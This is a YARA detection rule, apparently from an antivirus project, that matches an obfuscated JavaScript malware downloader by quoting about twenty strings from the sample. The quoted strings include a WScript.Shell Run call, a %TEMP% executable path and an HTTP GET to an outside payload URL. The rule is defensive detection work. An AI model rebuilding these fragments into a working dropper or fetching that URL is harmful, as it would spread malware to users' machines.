rule sig_20160328_052d589d2546c249553b5dcbe840ae25 {
  meta:
    description = "datamaliciousorder - file 20160328_052d589d2546c249553b5dcbe840ae25.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1e53413ef9feb64053256cbf5aab7011e624c987625305ced58df81f7ab84869"

  strings:
    $s1  = "function Uhsvyngesa() {return Hyqzwqki[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"QneFypacV.exe\";};" fullword ascii
    $s2  = "Lujcists[Pokoxnstkd](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Bcdwwwbc](Dnkpfp() * 11)} while (Lujcists[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Hyqzwqki = function Wuespgkia() {return WScript[Uutokv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Isjtly(Yxmzvywf, Udkcmyjntj){return Yxmzvywf - Udkcmyjntj;};" fullword ascii
    $s6  = "function Yvzpyne(Eyhxhvudsv){Hyqzwqki[\"Run\"](Eyhxhvudsv, Kokpg, Kokpg);};" fullword ascii
    $s7  = "function Iuplgxrpsu() {return ((Vojqwa == true) && (Vojqwa == Tbdmwoaixr)) ? 1 : Kokpg;};" fullword ascii
    $s8  = "function Iekjeogiz()" fullword ascii
    $s9  = "Tbdmwoaixr = true; " fullword ascii
    $s10 = " while (Psesczwo){" fullword ascii
    $s11 = "function Qpckqsk(Okpaxrt) {var Niofkwnl = (1, 2, 3, 4, 5, Okpaxrt); return Niofkwnl;};" fullword ascii
    $s12 = "var Vojqwa = false;" fullword ascii
    $s13 = "var Txldqus = false;" fullword ascii
    $s14 = "function Safaa(){return Tuqrstspo;};" fullword ascii
    $s15 = "return Isjtly(Afilpm, Yqrliocdgh);" fullword ascii
    $s16 = "var Uqnzbbh = new this[\"Date\"]();" fullword ascii
    $s17 = "var Tbdmwoaixr = false;" fullword ascii
    $s18 = "function Vyblxydf(){return Uutokv;};" fullword ascii
    $s19 = "Vojqwa = true; " fullword ascii
    $s20 = "function Dnkpfp(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}